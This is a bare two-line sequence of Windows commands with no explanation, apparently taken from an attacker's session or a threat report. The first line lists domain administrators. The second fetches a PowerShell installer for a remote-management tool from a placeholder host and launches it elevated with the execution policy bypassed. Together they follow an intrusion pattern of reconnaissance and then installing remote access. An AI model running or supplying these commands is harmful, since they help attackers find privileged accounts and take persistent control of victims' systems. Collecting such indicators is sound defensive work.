net group "domain admins" /domain
Invoke-WebRequest -Uri 'https://rmm.invalid/api/ClientDownloads/WindowsInstaller/0f3db892-22d4-4479-a7ec-e54a375bd19c' -OutFile "${env:TEMP}\Install-Remotely.ps1" -UseBasicParsing; Start-Process -FilePath 'powershell.exe' -ArgumentList ("-executionpolicy", "bypass", "-f", "${env:TEMP}\Install-Remotely.ps1") -Verb RunAs;
